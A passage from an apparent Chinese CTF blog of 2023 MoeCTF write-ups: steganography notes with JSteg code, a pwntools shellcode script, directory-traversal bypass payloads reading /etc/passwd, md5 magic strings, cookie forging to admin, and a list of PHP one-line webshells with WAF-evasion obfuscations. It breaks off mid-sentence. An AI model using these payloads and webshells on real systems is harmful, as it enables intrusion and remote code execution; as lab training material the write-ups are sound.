Compression）技术常见的隐写方法有JSteg、JPHide、Outguess、F5</code></pre><p>Jsteg隐写</p><pre><code>将秘密信息嵌入在量化后的DCT系数的LSB上原始值为-1,0，+1的DCT系数除外量化后的DCT系数中有负数</code></pre><p>实现</p><p>import math<br>import cv2<br>import numpy as np</p><p>def dct(m):<br>    m &#x3D; np.float32(m)&#x2F;255.0<br>    return cv2.dct(m)*255</p><p>class Jsteg:<br>  def <strong>init</strong>(self):<br>    self.sequence_after_dct&#x3D;None</p><p>  def set_sequence_after_dct(self,sequence_after_dct):<br>    self.sequence_after_dct&#x3D;sequence_after_dct<br>    self.available_info_len&#x3D;len([i for i in self.sequence_after_dct if i not in (-1,1,0)]) # 不是绝对可靠的<br>    print (“Load&gt;&gt; 可嵌入”,self.available_info_len,’bits’)</p><p>  def get_sequence_after_dct(self):<br>    return self.sequence_after_dct</p><p>  def write(self,info):<br>    “””先嵌入信息的长度，然后嵌入信息”””<br>    info&#x3D;self._set_info_len(info)<br>    info_len&#x3D;len(info)<br>    info_index&#x3D;0<br>    im_index&#x3D;0<br>    while True:<br>      if info_index&gt;&#x3D;info_len:<br>        break<br>      data&#x3D;info[info_index]<br>      if self._write(im_index,data):<br>        info_index+&#x3D;1<br>      im_index+&#x3D;1</p><p>  def read(self):<br>    “””先读出信息的长度，然后读出信息”””<br>    _len,sequence_index&#x3D;self._get_info_len()<br>    info&#x3D;[]<br>    info_index&#x3D;0</p><pre><code>while True:  if info_index&gt;=_len:    break  data=self._read(sequence_index)  if data!=None:    info.append(data)    info_index+=1  sequence_index+=1 return info</code></pre><p>  #&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;#</p><p>  def _set_info_len(self,info):<br>    l&#x3D;int(math.log(self.available_info_len,2))+1<br>    info_len&#x3D;[0]*l<br>    _len&#x3D;len(info)<br>    info_len[-len(bin(_len))+2:]&#x3D;[int(i) for i in bin(_len)[2:]]<br>    return info_len+info</p><p>  def _get_info_len(self):<br>    l&#x3D;int(math.log(self.available_info_len,2))+1<br>    len_list&#x3D;[]<br>    _l_index&#x3D;0<br>    _seq_index&#x3D;0<br>    while True:<br>      if _l_index&gt;&#x3D;l:<br>        break<br>      _d&#x3D;self._read(_seq_index)<br>      if _d!&#x3D;None:<br>        len_list.append(str(_d))<br>        _l_index+&#x3D;1<br>      _seq_index+&#x3D;1<br>    _len&#x3D;’’.join(len_list)<br>    _len&#x3D;int(_len,2)<br>    return _len,_seq_index</p><p>  def _write(self,index,data):<br>    origin&#x3D;self.sequence_after_dct[index]<br>    if origin in (-1,1,0):<br>      return False</p><pre><code>lower_bit=origin%2if lower_bit==data:  passelif origin&gt;0:  if (lower_bit,data) == (0,1):    self.sequence_after_dct[index]=origin+1  elif (lower_bit,data) == (1,0):    self.sequence_after_dct[index]=origin-1elif origin&lt;0:  if (lower_bit,data) == (0,1):    self.sequence_after_dct[index]=origin-1  elif (lower_bit,data) == (1,0):    self.sequence_after_dct[index]=origin+1 return True</code></pre><p>  def _read(self,index):<br>    if self.sequence_after_dct[index] not in (-1,1,0):<br>      return self.sequence_after_dct[index]%2<br>    else:<br>      return None</p><p>if <strong>name</strong>&#x3D;&#x3D;”<strong>main</strong>“:<br>  jsteg&#x3D;Jsteg()</p><h1 id="写-1"><a href="#写-1" class="headerlink" title="写"></a>写</h1><p>  sequence_after_dct&#x3D;[-1,0,1]*100+[i for i in range(-7,500)]<br>  jsteg.set_sequence_after_dct(sequence_after_dct)<br>  info1&#x3D;[0,1,0,1,1,0,1,0]<br>  jsteg.write(info1)<br>  sequence_after_dct2&#x3D;jsteg.get_sequence_after_dct()</p><h1 id="读-1"><a href="#读-1" class="headerlink" title="读"></a>读</h1><p>  jsteg.set_sequence_after_dct(sequence_after_dct2)<br>  info2&#x3D;jsteg.read()<br>  print (info2)</p><p>Outgusee算法</p><pre><code>针对Jsteg算法的缺陷提出的一种方法嵌入过程不修改ECT系数值为0，1的DCT系数利用为随机数发生器产生间隔以决定下一个要嵌入的DCT系数的位置纠正过程消除对效应的出现</code></pre><p>识别方法</p><pre><code>Stegdetect：检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息JPHS：针对JPHideOutguess：针对OutGuess</code></pre><p>5、数字水印隐写</p><p>数字水印（digital watermark）</p><pre><code>在数字化的数据内容中嵌入不明显的记号被嵌入的记号通常是不可见或不可察的可以通过计算操作检测或者提取</code></pre><p>盲水印</p><pre><code>对图像进行傅里叶变换，起始是一个二维离散傅里叶变换，图像的频率是指图像灰度变换的强烈程度将二维图像由空间域变为频域后，图像上的每个点的值都变成了复数，也就是所谓的复频域，通过复数的实部和虚部，可以计算出幅值和相位，计算幅值即对复数取模值，将取模值后的矩阵显示出来，即为其频谱图对模值再取对数，在在0~255的范围内进行归一化，这样才能够准确的反映到图像上，发现数据之间的差别，区分高频和低频分量</code></pre><p>识别方法</p><pre><code>bwm</code></pre><p>实例</p><pre><code>攻防世界 Misc高手进阶区 3分题 warmup攻防世界 Misc高手进阶区 3分题 信号不好先挂了</code></pre><p>6、图片容差隐写</p><p>容差</p><pre><code>在选取颜色时所设置的选取范围容差越大，选取的范围也越大其数值是在0-255之间</code></pre><p>容差比较的隐写</p><pre><code>若是有两张图片，则对两张图片的每一个像素点进行对比，设置一个容差的阈值α，超出这个阈值的像素点RGB值设置为(255,255,255),若是没超过阈值，则设置该像素点的RGB值为(0,0,0)。因此，通过调整不同的α值，可以使对比生成的图片呈现不同的画面。比如两张图完全一样，设置阈值α为任何值，最后得到的对比图都只会是全黑。若两张图每一个像素点都不同，阈值α设置为1，则对比图将是全白。如果将隐藏信息附加到某些像素点上，这时调整阈值α即可看到隐藏信息。如果是一张图片，则根据每一像素点周围像素的值进行判断，同样设置一个阈值，若当前像素点超过周围像素点的均值，或者其它的某种规则，则将该像素点RGB值置为(255,255,255)，反之则不进行处理，或者设置为全0.这样也可以获得隐藏的信息。</code></pre><p>识别方法</p><pre><code>beyond compare比较图片</code></pre><p>7、打乱进制</p><p>比如把整个二进制都逆序<br>得到一堆乱码</p><p>识别方法</p><pre><code>winhex，看文件头尾是不是互换且逆序</code></pre><p>实例</p><pre><code>攻防世界 Misc高手进阶区 2分题 Reverse-it</code></pre><p>8、GIF的组合</p><p>gif每帧是某个图的一部分<br>提取每帧再拼接</p><p>工具</p><pre><code>ps</code></pre><p>实例</p><pre><code>攻防世界 Misc高手进阶区 2分题 glance-50攻防世界 Misc高手进阶区 3分题 双色块</code></pre><p>三、音频隐写</p><p>简单提一下</p><pre><code>频谱图藏信息高低位二进制波形藏摩斯密码MP3Stego音频中也有LSB</code></pre><p>本来想自己整理下<br>看到国光大佬的很全面<br>就直接放个链接</p><p>CTF中音频隐写的一些整理总结</p><p>实例</p><pre><code>攻防世界 Misc高手进阶区 2分题 Hear-with-your-Eyes攻防世界 Misc高手进阶区 3分题 很普通的Disco攻防世界 Misc高手进阶区 4分题 intoU</code></pre><p>四、电子文档隐写<br>1、隐藏文字</p><p>看图说话<br>2、文件隐藏</p><p>类似图片隐藏文件<br>直接看例子吧<br>攻防世界 Misc高手进阶区 3分题 小小的PDF<br>结语</p><p>对常见文件文件头和图片音频文档隐写术做了个总结</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-shellcode_level0</title>
      <link href="/2023/10/02/pwnshell0/"/>
      <url>/2023/10/02/pwnshell0/</url>
      
        <content type="html"><![CDATA[<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>题目直接说了是shellcode，而且可以脚本一把梭，那就试试看吧</p><h1 id="检查安全性"><a href="#检查安全性" class="headerlink" title="检查安全性"></a>检查安全性</h1><p>先下载附件，放到kali里面用checksec检查一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">checksec shellcode_level0 </span><br><span class="line">[*] &#x27;/root/pwn/MoeCTF/shellcode0/shellcode_level0&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>回显显示，没有任何过滤（canary found，NX disabled），可以尝试使用shellcraft构造shellcode</p><h1 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h1><p>一把梭的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = process(&#x27;./shellcode_level0&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">43039</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="Get-Flag"><a href="#Get-Flag" class="headerlink" title="Get Flag"></a>Get Flag</h1><p>运行得到可交互shell，cat flag获得flag：<br><img src="/images/pwnshell0flag.png"></p><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.做之前不懂什么是shellcode脚本一把梭，只能说需要多多学习</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web-another upload</title>
      <link href="/2023/10/02/meoupload/"/>
      <url>/2023/10/02/meoupload/</url>
      
        <content type="html"><![CDATA[<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>先来看题，很经典的一个文件上传：<br><img src="/images/meoupload1.JPG"></p><h1 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h1><p>看起来没什么问题，那就先debug一下，先上传一个正常的文件，发现返回了地址，点击查看观察地址组成，发现这个地址被images.php处理过，不能直接利用：<br><img src="/images/meoupload2.JPG"><br>尝试访问一个不存在的地址，发现返回错误：<br><img src="/images/meoupload3.JPG"><br>发现有函数file_get_contents()，搜索发现，此函数可能会导致文件包含或者目录穿越，尝试发现有目录穿越漏洞，以下是关于目录穿越的知识：</p><p>什么是目录遍历？</p><p>目录遍历（目录穿越）是一个Web安全漏洞，攻击者可以利用该漏洞读取运行应用程序的服务器上的任意文件。 这可能包括应用程序代码和数据，后端系统的登录信息以及敏感的操作系统文件。</p><p>在某些情况下，攻击者可能能够在服务器上写入任意文件，（如，FFFTP是一款小型的FTP客户端软件。FFFTP客户端没有正确地验证FTP服务器所返回的LIST命令响应中包含有目录遍历序列（斜线）的文件名，如果用户受骗从恶意的FTP服务器下载的目录包含有带有恶意文件名的文件的话，就可能导致向用户系统的任意位置写入文件）从而允许他们修改应用程序数据或行为，并最终完全控制服务器。</p><p>漏洞原理</p><p>若web要显示一个商品的图像，有时候开发者会用通过HTML加载，如：</p><img src="/loadImage?filename=214.png"><p>使用filename参数加载图像文件，图片文件位置可能映射在 &#x2F;var&#x2F;www&#x2F;images&#x2F; 上，所以真实的路径是 &#x2F;var&#x2F;www&#x2F;images&#x2F;214.png </p><p>这就导致了攻击者可以读取服务器上的任意文件：</p><p><a href="https://www.*****.com/loadImage?filename=../../../etc/passwd">https://www.*****.com/loadImage?filename=../../../etc/passwd</a></p><p>filename的参数值与真实路径组合起来就是：</p><p>&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p><p>其等价于：</p><p>&#x2F;etc&#x2F;passwd</p><pre><code>在Unix操作系统上，../ 是一个标准的返回上一级路径的语法；在Windows操作系统上， ../ 和 ..\ 都是返回上一级的语句。</code></pre><p>实验<br>0x00  基础目录遍历</p><p>查看商品的图片，可以看到是通过filename参数来确定图片的：</p><p>右键打开图片，同时抓包，可以修改filename参数值，利用 ..&#x2F; 返回上一级来遍历任意文件：</p><p>filename&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p><p>0x01  绝对路径</p><p>web网站有时候会采取目录遍历的防御措施，如过滤 ..&#x2F; 上一级等关键字，然后简单的过滤通常会被绕过。有时候可以直接采用绝对路径，无须..&#x2F;返回上一级目录遍历：</p><p>filename&#x3D;&#x2F;etc&#x2F;passwd</p><p>0x02  双写..&#x2F;绕过</p><p>有时候，防御措施是直接将 ..&#x2F; 替换为空，可以直接采用双写&#x2F;复写直接绕过：</p><p>filename&#x3D;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</p><p>如果在….&#x2F;&#x2F;中，将..&#x2F;替换为空，最后的路径就变成：</p><pre><code>....//  =&gt; ../</code></pre><p>0x03  URL编码绕过</p><p>也可以采用URL编码来绕过服务器对 . 或者 &#x2F; 的检测：</p><pre><code>.   =&gt;  %2e/   =&gt;  %2f% =&gt; %25  (双重URL编码)</code></pre><p>先尝试编码 &#x2F; ，失败:</p><p> 全编码，失败：</p><p>双重编码，即将%编码，成功：</p><p>0x04  绝对路径配合..&#x2F;</p><p>有些web在获取filename图片文件的时候，会首先判断是否以一个固定的路径开头：</p><p>那么就可以配合..&#x2F;来返回上一级遍历任意文件：</p><p>filename&#x3D;&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p><p>0x05  截断文件后缀</p><p>某些web对filename的文件类型作了限制，只有当后缀为图片时才解析</p><p>这时候就可以利用 %00 来截断：</p><p>总之，目录遍历漏洞不会仅限于一个绕过姿势，通常会配合多个姿势进行组合攻击。</p><p>防御</p><p>防止文件路径遍历漏洞的最有效方法是避免将用户提供的输入完全传递给文件系统API。</p><p>如果认为不可避免的是将用户提供的输入传递给文件系统API，则应同时使用两层防御，以防止受到攻击：</p><pre><code>    应用程序应在处理之前验证用户输入。理想情况下，验证应与允许值的白名单进行比较。如果所需的功能无法做到这一点，则验证应验证输入内容仅包含允许的内容，例如纯字母数字字符。    验证提供的输入后，应用程序应将输入附加到基本目录，并使用平台文件系统API规范化路径。验证规范化路径以预期的基本目录开头。</code></pre><p>以下是一些简单的Java代码示例，用于根据用户输入来验证文件的规范路径：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(BASE_DIRECTORY, userInput);</span><br><span class="line"><span class="keyword">if</span> (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) &#123;</span><br><span class="line">    <span class="comment">// process file</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h1><p>抓包，并在burpsuit的repeater里构造重发数据包来目录穿越，发现返回了一个php文件：<br><img src="/images/meoupload4.JPG"><br>访问这个文件发现需要审计代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$param1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param1&#x27;</span>];</span><br><span class="line">    <span class="variable">$param2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$param1</span> !== <span class="variable">$param2</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$md5Param1</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$param1</span>);</span><br><span class="line">        <span class="variable">$md5Param2</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$param2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$md5Param1</span> == <span class="variable">$md5Param2</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;O.O!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;O.o??&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;o.O?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;O.o?&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>审计发现，需要传param1和param2两个值，这两个值需要不一样，但是他们的md5要一样</p><h1 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h1><p>上网搜索发现这样的字符，构造url访问，得到flag：<br><img src="/images/meouploadflag.JPG"></p><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.当时做的时候尝试访问各种url，尝试泄露，即使知道file_get_content()也不会使用，看了其他人的wp后知道目录穿越就会做了<br>2.附上一些字符不同但md5相同的字符做备用：</p><p>附上一个5位数和一个6位数的0e开头md5全数字的值：</p><p>byGcY<br>0e591948146966052067035298880982<br>sonZ7y<br>0e463306343746311593316642162425</p><p>只包含一种字符的0e开头的md5值：</p><p>1FVWc<br>0ef715f5943144181839f9f321584156<br>2uM8z<br>0e0081018231f666742748f3540f4761<br>3za1b<br>0e02f196724391824188f3f90f732735</p><p>只包含两种字符的0e开头的md5值：</p><p>00c84<br>0e17d931d17f1948d37d691693995ff1<br>01bDI<br>0ee26113820055502806791698800f47<br>01NxP<br>0e72096d884f956d9618012679405269<br>02K7w<br>0e543091322e0f42ef1126374409f755<br>04072<br>0e8f06d06387944ff396030861fd2698<br>044Dt<br>0e91946379408e6f2f62152293e4f596<br>05nnu<br>0ef580f7a2f4176f57544f8091f33936<br>05wPJ<br>0e49528768d18f101816843669079475</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web-cookit and json</title>
      <link href="/2023/10/01/ctfjson/"/>
      <url>/2023/10/01/ctfjson/</url>
      
        <content type="html"><![CDATA[<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>用浏览器访问，发现是这样，结合题目给的附件，应该是要发送json数据来得到flag：<br><img src="/images/ctfjson1.JPG"></p><h1 id="思路过程"><a href="#思路过程" class="headerlink" title="思路过程"></a>思路过程</h1><p>查看附件，发现给出了&#x2F;register,&#x2F;login,&#x2F;flag等地址，判断是要我们注册用户，登录后用get请求得到flag，使用postman发送json数据，方便快捷。先试了一下附件给出的账号，注册发现用户已存在，而且登录密码也不正确，所以需要自己注册一个用户：<br><img src="/images/ctfjson1.JPG"><br><img src="/images/ctfjson2.JPG"><br><img src="/images/ctfjson3.JPG"><br>注册和登录都返回ok，但是获取flag时返回了一个假flag，并提示我们不是admin，根据题目cookie，判断问题出在cookie上，查看cookie发现有一个token，内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=eyJ1c2VybmFtZSI6ICJodXN0bGVyIiwgInBhc3N3b3JkIjogIjEyMzQ1NiIsICJyb2xlIjogInVzZXIifQ==</span><br></pre></td></tr></table></figure><p>看着末尾的两个大等号，说明这有可能时base64，进行base64解码后的数据是这样的：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hustler&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123456&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>显然，我们将role的值改为admin，即：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hustler&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123456&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>再将这串数据用base64编码，得到修改后的token</p><h1 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h1><p>用postman修改cookie，并且get请求&#x2F;flag后得到flag：<br><img src="/images/ctfjsonflag.JPG"></p><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.刚开始做的时候以为是给cookie增加新的键值对，没有注意token是base64编码过后的。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web-EZ FileUpload</title>
      <link href="/2023/09/29/ezup/"/>
      <url>/2023/09/29/ezup/</url>
      
        <content type="html"><![CDATA[<h1 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h1><p><img src="/images/ezup1.JPG"><br>一道经典的文件上传，看到这个思路马上就来了，就是上传一个php一句话木马，然后用蚁剑回连</p><h1 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h1><p>我们先抓个包看看，这里有一个小插曲，就是如果我用127.0.0.1这个环回地址来访问，burp是抓不到包的，用局域网中的ip加端口号来访问就可以抓到包，配置好burp和浏览器的代理，先任意上传一个文件，得到如下提示：<br><img src="/images/ezup2.JPG"><br>抓包并修改文件后缀为png发现能够上传，说明这是一个前端验证，很好绕过<br>我们再次尝试，这次传一个符合要求的文件：<br><img src="/images/ezup3.JPG"><br><img src="/images/ezup4.JPG"><br>发现上传成功，并返回了一个地址，但是直接访问这个地址会返回404，根据抓包结果以及题目的hint，猜想正确地址应该只有upload以及后面的url，尝试发现可以访问。<br>那么，我们是不是只要通过抓包修改后缀绕过前端，就可以上传php木马了呢？</p><h1 id="进一步尝试"><a href="#进一步尝试" class="headerlink" title="进一步尝试"></a>进一步尝试</h1><p>首先我们先构造一个一句话木马，使用文本编辑器编写，完成后将后缀改为png，下面附上一句话木马的基本知识：</p><p>什么是一句话木马</p><pre><code>一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数执行了我们发送的命令。</code></pre><p>我们如何发送命令，发送的命令如何执行？</p><p>我们可以通过GET 、POST 、COOKIE这三种方式向一个网站提交数据，一句话木马用$_GET[‘ ‘]、$_POST[‘ ‘]、$_COOKIE[‘ ‘] 接收我们传递的数据，并把接收的数据传递给一句话木马中执行命令的函数，进而执行命令。<br>所以看到的经典一句话木马大多都是只有两个部分，一个是可以执行代码的函数部分，一个是接收数据的部分。</p><p>例如：<?php eval(@$_POST['a']); ?></p><p>其中eval就是执行命令的函数，$_POST[‘a’]就是接收的数据。eval函数把接收的数据当作PHP代码来执行。这样我们就能够让插入了一句话木马的网站执行我们传递过去的任意PHP语句。这便是一句话木马的强大之处。</p><p>因为木马是接收post请求中 “a” 的数据（ $_POST[‘a’]）,所以我们必须以post方法发送数据并且将我们要执行的代码赋值给“a”。如果把木马中的post替换成get，那么我么就需要以GET方法发送“a”，（ 就像这样： <a href="http://127.0.0.1/test.php?a=phpinfo()">http://127.0.0.1/test.php?a=phpinfo()</a>; ）我就不再另行演示了。<br>使用 其他函数制作一句话木马<br>assert函数</p><?php assert(@$_POST['a']); ?><p>create_function函数</p><?php$fun = create_function('',$_POST['a']);$fun();?><p>把用户传递的数据生成一个函数fun()，然后再执行fun()<br>call_user_func回调函数</p><?php@call_user_func(assert,$_POST['a']);?><p>call_user_func这个函数可以调用其它函数，被调用的函数是call_user_func的第一个函数，被调用的函数的参数是call_user_func的第二个参数。这样的一个语句也可以完成一句话木马。一些被waf拦截的木马可以配合这个函数绕过waf。<br>preg_replace函数</p><?php@preg_replace("/abcde/e", $_POST['a'], "abcdefg");?><p>这个函数原本是利用正则表达式替换符合条件的字符串，但是这个函数有一个功能——可执行命令。这个函数的第一个参数是正则表达式，按照PHP的格式，表达式在两个“&#x2F;”之间。如果我们在这个表达式的末尾加上“e”，那么这个函数的第二个参数就会被当作代码执行。<br>file_put_contents函数</p><pre><code>利用函数生成木马</code></pre><?php$test='<?php $a=$_POST["cmd"];assert($a); ?><p>‘;<br>file_put_contents(“Trojan.php”, $test);<br>?&gt;</p><p>函数功能：生成一个文件，第一个参数是文件名，第二个参数是文件的内容。<br>如何让一句话木马绕过waf ?</p><pre><code>waf是网站的防火墙，例如安全狗就是waf的一种。waf通常以关键字判断是否为一句话木马，但是一句话木马的变形有很多种，waf根本不可能全部拦截。想要绕过waf，需要掌握各种PHP小技巧，掌握的技巧多了，把技巧结合起来，设计出属于自己的一句话木马。</code></pre><p>PHP变量函数</p><?php$a = "eval";$a(@$_POST['a']);?><p>第三行使用了变量函数$a，变量储存了函数名eval，便可以直接用变量替代函数名。<br>PHP可变变量</p><?php$bb="eval";$a="bb";$$aa($_POST['a']);?><p>看这句就能理解上述语句：$$aa &#x3D; $($aa) &#x3D; $ (‘bb’) &#x3D; $bb &#x3D; “eval”<br>str_replace函数</p><?php$a=str_replace("Waldo", "", "eWaldoval");$a(@$_POST['a']);?><p>函数功能：在第三个参数中，查找第一个参数，并替换成第二个参数。这里第二个参数为空字符串，就相当于删除”Waldo”。<br>base64_decode函数</p><?php$a=base64_decode("ZXZhbA==")$a($_POST['a']);?><p>这里是base64解密函数，”ZXZhbA&#x3D;&#x3D;”是eval的base64加密。<br>“.”操作符</p><?php$a="e"."v";$b="a"."l";$c=$a.$b;$c($_POST['a']);?><p>parse_str函数</p><?php$str="a=eval";parse_str($str);$a($_POST['a']);?><p>执行这个函数后，生成一个变量$a，值为字符串”eval”<br>更多技巧…</p><p>多实战，多谷歌！<br>上述六种技巧每一种单独使用都不能绕过waf，但是与 第三大点提到的函数混合起来使用，就可以顺利的欺骗waf。<br>tips：使用一句话木马的时候可以在函数前加”@”符，这个符号让php语句不显示错误信息，增加隐蔽性。<br>再来一个小栗子</p><?phpfunction fun(){return $_POST['a'];}@preg_replace("/test/e",fun(),"test test test");?><p>这里又有一个技巧，创建函数 